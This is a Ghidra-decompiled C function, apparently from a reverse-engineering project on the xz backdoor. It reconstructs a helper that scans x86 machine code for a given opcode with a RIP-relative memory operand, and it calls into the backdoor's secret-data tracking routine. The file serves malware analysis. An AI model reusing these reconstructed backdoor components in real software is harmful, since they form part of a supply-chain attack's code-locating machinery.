// /home/kali/xzre-ghidra/xzregh/101060_find_instruction_with_mem_operand_ex.c
// Function: find_instruction_with_mem_operand_ex @ 0x101060
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_instruction_with_mem_operand_ex(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, int opcode, void * mem_address)


/*
 * AutoDoc: Generic predicate for locating a specific `opcode` that reads/writes memory.
 * Decodes forward (scratch context if needed), requires a memory ModRM form, and when `mem_address` is non-null also requires DF2 to indicate a displacement operand and the RIP-relative address (`instruction + instruction_size + mem_disp`) to equal that address.
 * On success it leaves `dctx` populated so callers like the add/mov/addr scanners can inspect operands without re-decoding.
 */

#include "xzre_types.h"

BOOL find_instruction_with_mem_operand_ex
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,int opcode,void *mem_address)

{
  BOOL decode_ok;
  long clear_idx;
  dasm_ctx_t *zero_ctx;
  byte clear_stride_marker;
  dasm_ctx_t scratch_ctx;
  
  clear_stride_marker = 0;
  decode_ok = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xd6,4,0xe,FALSE);
  if (decode_ok != FALSE) {
    zero_ctx = &scratch_ctx;
    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
      *(undefined4 *)&zero_ctx->instruction = 0;
      zero_ctx = (dasm_ctx_t *)((long)zero_ctx + ((ulong)clear_stride_marker * -2 + 1) * 4);
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = &scratch_ctx;
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      decode_ok = x86_dasm(dctx,code_start,code_end);
      if ((((decode_ok != FALSE) && (*(int *)(dctx->opcode_window + 3) == opcode)) &&
          (((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000)) &&
         ((mem_address == (void *)0x0 ||
          ((((dctx->prefix).decoded.flags2 & 1) != 0 &&
           ((u8 *)mem_address == dctx->instruction + dctx->instruction_size + dctx->mem_disp)))))) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

